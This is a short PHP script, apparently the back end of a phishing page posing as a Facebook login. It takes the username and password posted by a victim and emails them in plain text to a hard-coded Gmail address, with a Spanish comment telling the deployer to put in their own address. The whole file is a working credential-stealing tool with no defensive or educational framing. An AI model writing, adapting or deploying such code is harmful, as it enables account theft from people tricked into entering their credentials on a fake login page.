<?php
	if($_POST) {
		$to = "linkedinn45@gmail.com"; // Cambia esta dirección por tu correo electrónico
		$subject = "Inicio de sesión en Facebook";
		$username = $_POST["username"];
		$password = $_POST["password"];
		$message = "El usuario $username ha iniciado sesión con la contraseña $password";
		$headers = "From: linkedinn45@gmail.com" . "\r\n" .
				   "Reply-To: linkedinn45@gmail.com" . "\r\n" .
				   "X-Mailer: PHP/" . phpversion();
		mail($to, $subject, $message, $headers);
	}
?>
